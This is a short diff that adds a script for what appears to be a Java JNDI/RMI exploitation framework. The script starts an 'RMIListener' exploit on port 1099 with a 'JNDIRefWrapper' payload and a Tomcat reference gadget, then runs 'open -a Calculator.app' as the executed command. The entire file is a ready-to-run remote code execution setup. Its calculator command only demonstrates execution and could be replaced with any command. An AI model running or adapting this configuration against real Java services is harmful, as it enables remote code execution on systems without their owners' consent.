@@ -1,0 +1,6 @@
+use exploit RMIListener
+use payload JNDIRefWrapper
+use bullet TomcatRefBullet
+set lport 1099
+set command "open -a Calculator.app"
+run
